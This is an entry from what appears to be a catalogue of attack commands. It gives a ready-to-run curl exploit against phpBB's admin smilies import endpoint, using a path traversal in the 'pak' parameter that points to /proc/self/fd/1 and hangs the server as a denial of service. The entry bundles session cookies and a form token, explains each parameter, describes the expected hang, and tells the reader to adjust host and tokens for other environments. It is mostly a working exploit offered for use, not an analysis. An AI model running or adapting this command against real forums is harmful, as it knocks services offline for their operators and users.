---
data: >-
  curl -X POST
  "http://127.0.0.1:8082/adm/index.php?i=acp_icons&mode=smilies&current=delete"
  -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie:
  csrftoken=Ky6rB5uThxl3PwYd6EScmT9WXYiH6rGe;
  sessionid=hmrhwwo5hj5abu4kqgln2let1x9zudbr; phpbb3_83bmg_u=2;
  phpbb3_83bmg_k=zalvonnyh1lr16og;
  phpbb3_83bmg_sid=3ba797a8668f6db1639ac6939d91f96e" -H "Host: 127.0.0.1:8082"
  -d
  "action=import&pak=../../../../../../../../../proc/self/fd/1&form_token=b2655d5f0c9edb201328b799a61777b26cef16a5&creation_time=1694960302"
tags:
  - dos
  - path-traversal
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.090Z'
id: d1c9e36a-4b93-448c-a64d-efc9454e5e8c
verified: false
validated: true
submitted: true
---
---

# phpbb-path-traversal-dos-import

## Command

```bash
curl -X POST "http://127.0.0.1:8082/adm/index.php?i=acp_icons&mode=smilies&current=delete" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: csrftoken=Ky6rB5uThxl3PwYd6EScmT9WXYiH6rGe; sessionid=hmrhwwo5hj5abu4kqgln2let1x9zudbr; phpbb3_83bmg_u=2; phpbb3_83bmg_k=zalvonnyh1lr16og; phpbb3_83bmg_sid=3ba797a8668f6db1639ac6939d91f96e" -H "Host: 127.0.0.1:8082" -d "action=import&pak=../../../../../../../../../proc/self/fd/1&form_token=b2655d5f0c9edb201328b799a61777b26cef16a5&creation_time=1694960302"
```

## Description

Sends a POST request to phpBB's smilies import endpoint exploiting path traversal in 'pak' to target /proc/self/fd/1, causing the file() function to hang and induce DoS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| pak | Traversal path to /proc/self/fd/1 | Yes |
| action | Set to 'import' | Yes |
| form_token | Valid CSRF token | Yes |
| creation_time | Timestamp for form | Yes |

## Examples

### Basic Usage

```bash
curl ... (as above)
```

### Advanced Usage

Adjust host, port, and tokens for different environments.

## Expected Output

Request times out with no response, hanging the connection and burdening the server.

## Related

- [[Related Procedure: Exploit-Path-Traversal-for-DoS]]
